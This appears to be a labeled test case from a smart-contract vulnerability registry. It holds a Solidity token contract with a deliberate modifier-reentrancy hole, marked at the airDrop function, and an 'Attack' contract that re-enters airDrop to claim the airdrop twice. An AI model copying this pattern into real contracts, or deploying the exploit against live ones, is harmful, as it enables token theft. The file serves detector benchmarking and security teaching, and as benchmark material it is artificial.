/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/reentracy/modifier_reentrancy.sol
 * @author: - 
 * @vulnerable_at_lines: 15
 */

contract ModifierEntrancy {
    event DebugUint(uint);
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";

  //If a contract has a zero balance and supports the token give them some token
  // <yes> <report> REENTRANCY
  function airDrop() hasNoBalance supportsToken  public{
    emit DebugUint(2);
    tokenBalance[msg.sender] += 20; /* <RE_VUL> */
  }

  //Checks that the contract responds the way we want
  modifier supportsToken() {
    require(keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).supportsToken()); /* <RE_ENT> */
    _;
  }
  //Checks that the caller has a zero balance
  modifier hasNoBalance {
      require(tokenBalance[msg.sender] == 0);
      _;
  }
}

contract Bank{
    function supportsToken() external pure returns(bytes32){
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}

contract Attack{ //An example of a contract that breaks the contract above.
    event DebugUint(uint);
    bool hasBeenCalled;
    function supportsToken() external returns(bytes32){
        emit DebugUint(3);
        if(!hasBeenCalled){
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }
    function attaque(address token) public{
        emit DebugUint(1);
        ModifierEntrancy(token).airDrop();
    }
}

contract NoAttack{ //An example of a contract that breaks the contract above.
    event DebugUint(uint);
    function supportsToken() external pure returns(bytes32){
        return(keccak256(abi.encodePacked("Nu Token")));
    }
    function noattaque(address token) public{
        emit DebugUint(1);
        ModifierEntrancy(token).airDrop();
    }
}

